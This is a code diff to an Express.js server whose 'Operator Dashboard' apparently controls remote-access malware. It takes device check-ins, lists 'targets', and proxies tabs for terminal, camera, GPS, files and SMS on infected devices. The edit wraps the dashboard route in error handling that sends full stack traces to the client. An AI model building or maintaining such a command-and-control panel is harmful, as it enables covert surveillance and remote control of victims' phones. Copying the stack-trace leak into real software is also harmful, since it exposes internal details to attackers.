@@ -420,14 +420,15 @@ app.post('/api/rename-device', (req, res) => {
 
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
-    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
-        return handleCheckin(req, res);
-    }
+    try {
+        if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
+            return handleCheckin(req, res);
+        }
 
-    syncUploadsDirectory();
+        syncUploadsDirectory();
 
-    const deviceList = Array.from(devices.values());
-    const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
+        const deviceList = Array.from(devices.values());
+        const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
 
     let devicesHtml = deviceList.length === 0 ?
         '<tr><td colspan="9" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
@@ -695,6 +696,9 @@ app.get('/', (req, res) => {
 </html>`;
 
     res.send(html);
+    } catch (err) {
+        res.status(500).send('<h1>Internal Server Error</h1><pre>' + err.stack + '</pre>');
+    }
 });
 
 // Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
